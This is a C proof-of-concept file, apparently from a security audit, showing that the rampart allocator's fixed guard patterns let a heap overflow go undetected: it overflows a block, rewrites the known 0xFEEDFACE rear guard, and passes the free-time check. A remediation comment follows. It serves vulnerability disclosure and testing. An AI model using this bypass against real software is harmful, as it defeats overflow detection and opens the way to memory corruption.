/**
 * @file poc_04_guard_bypass.c
 * @brief PoC for VULN-004: Predictable Guard Band Patterns
 *
 * VULNERABILITY: Guard patterns are fixed constants (0xDEADBEEF, 0xFEEDFACE).
 *                Attacker can overflow buffer and restore expected patterns.
 *
 * CVSS 3.1: 8.1 (High)
 * CWE-330: Use of Insufficiently Random Values
 *
 * IMPACT: Complete bypass of buffer overflow detection. The primary
 *         security feature can be trivially defeated.
 *
 * LOCATION: h/internal/rp_types.h:71-80
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "rampart.h"

/*
 * Guard patterns from rp_types.h:
 * #define RP_GUARD_FRONT_PATTERN 0xDEADBEEFUL
 * #define RP_GUARD_REAR_PATTERN  0xFEEDFACEUL
 * #define RP_GUARD_SIZE 16
 *
 * Each guard is 16 bytes filled with the 4-byte pattern repeated.
 */

#define RP_GUARD_SIZE 16
#define RP_GUARD_REAR_PATTERN 0xFEEDFACEUL

/* Write the expected rear guard pattern */
static void write_fake_guard(unsigned char *ptr) {
    unsigned char pattern[4];
    int i;

    /* Big-endian byte order (as used in rp_block.c) */
    pattern[0] = (unsigned char)((RP_GUARD_REAR_PATTERN >> 24) & 0xFF);
    pattern[1] = (unsigned char)((RP_GUARD_REAR_PATTERN >> 16) & 0xFF);
    pattern[2] = (unsigned char)((RP_GUARD_REAR_PATTERN >> 8) & 0xFF);
    pattern[3] = (unsigned char)(RP_GUARD_REAR_PATTERN & 0xFF);

    for (i = 0; i < RP_GUARD_SIZE; i++) {
        ptr[i] = pattern[i % 4];
    }
}

int main(void) {
    rampart_config_t config;
    rampart_pool_t *pool;
    rampart_error_t err;
    char *buffer;
    char *next_block;
    const size_t alloc_size = 64;

    printf("=== VULN-004: Predictable Guard Band Patterns ===\n\n");

    /* Initialize pool with validation enabled */
    rampart_config_default(&config);
    config.pool_size = 64 * 1024;
    config.validate_on_free = 1;  /* Guard validation enabled! */

    pool = rampart_init(&config);
    if (pool == NULL) {
        printf("[!] Pool creation failed\n");
        return 1;
    }

    printf("[*] Pool created with validate_on_free=1\n");

    /* Allocate target buffer */
    buffer = (char *)rampart_alloc(pool, alloc_size);
    if (buffer == NULL) {
        printf("[!] Allocation failed\n");
        rampart_shutdown(pool);
        return 1;
    }

    printf("[*] Allocated %zu bytes at: %p\n", alloc_size, (void *)buffer);

    /* Allocate second buffer (will be corrupted) */
    next_block = (char *)rampart_alloc(pool, 64);
    if (next_block == NULL) {
        printf("[!] Second allocation failed\n");
        rampart_free(pool, buffer);
        rampart_shutdown(pool);
        return 1;
    }

    printf("[*] Second block at: %p\n", (void *)next_block);

    /*
     * NORMAL CASE: Overflow without fixing guard
     */
    printf("\n=== Test 1: Overflow WITHOUT guard repair ===\n");

    /* Write legitimate data */
    memset(buffer, 'A', alloc_size);

    /* Overflow by 20 bytes (corrupts rear guard) */
    printf("[*] Overflowing buffer by 20 bytes...\n");
    memset(buffer, 'X', alloc_size + 20);

    /* Try to free - should FAIL with guard corruption */
    err = rampart_free(pool, buffer);
    printf("[*] rampart_free() returned: %s\n", rampart_error_string(err));

    if (err == RAMPART_ERR_GUARD_CORRUPTED) {
        printf("[+] Guard corruption DETECTED (expected behavior)\n");
    } else {
        printf("[!] Unexpected: guard corruption not detected!\n");
    }

    /*
     * ATTACK: Overflow AND repair guard
     */
    printf("\n=== Test 2: Overflow WITH guard repair (ATTACK) ===\n");

    /* Re-allocate (previous free failed, so buffer still allocated) */
    /* Actually, we need to get a fresh buffer since the old one is in
     * a weird state. Let's use next_block instead. */

    printf("[*] Using second block for attack...\n");

    /* Write legitimate data first */
    memset(next_block, 'B', 64);

    /* Overflow by 20 bytes */
    printf("[*] Overflowing buffer by 20 bytes...\n");
    memset(next_block, 'Y', 64 + 20);

    /* NOW: Repair the rear guard with known pattern! */
    printf("[*] Repairing rear guard with known pattern 0xFEEDFACE...\n");
    write_fake_guard((unsigned char *)(next_block + 64));

    /* Try to free - should PASS despite overflow! */
    err = rampart_free(pool, next_block);
    printf("[*] rampart_free() returned: %s\n", rampart_error_string(err));

    if (err == RAMPART_OK) {
        printf("\n[VULNERABLE] Guard bypass successful!\n");
        printf("[!] Buffer overflow went UNDETECTED!\n");
        printf("[!] Attacker wrote 20 bytes beyond allocation.\n");
        printf("[!] Memory corruption occurred silently.\n");
    } else {
        printf("[+] Attack failed, guard validation still caught it.\n");
    }

    /*
     * IMPACT DEMONSTRATION
     */
    printf("\n=== Attack Impact ===\n");
    printf("With guard bypass, attacker can:\n");
    printf("  1. Overflow heap buffers undetected\n");
    printf("  2. Corrupt adjacent block headers\n");
    printf("  3. Achieve arbitrary write on next free/alloc\n");
    printf("  4. Execute arbitrary code\n");

    printf("\n=== Known Guard Patterns ===\n");
    printf("  Front Guard: 0xDEADBEEF (repeated 4x = 16 bytes)\n");
    printf("  Rear Guard:  0xFEEDFACE (repeated 4x = 16 bytes)\n");
    printf("  Guard Size:  16 bytes each\n");

    rampart_shutdown(pool);

    printf("\n=== PoC Complete ===\n");

    /*
     * REMEDIATION:
     * Use per-pool randomized guard patterns:
     *
     * In rp_pool_init():
     *     pool->guard_front_pattern = generate_crypto_random_u32();
     *     pool->guard_rear_pattern = generate_crypto_random_u32();
     *
     * Then use pool->guard_*_pattern instead of constants.
     *
     * Alternative: Include block address in pattern computation:
     *     pattern = hash(secret_key, block_address)
     *
     * This makes each block's guards unique and unpredictable.
     */

    return 0;
}
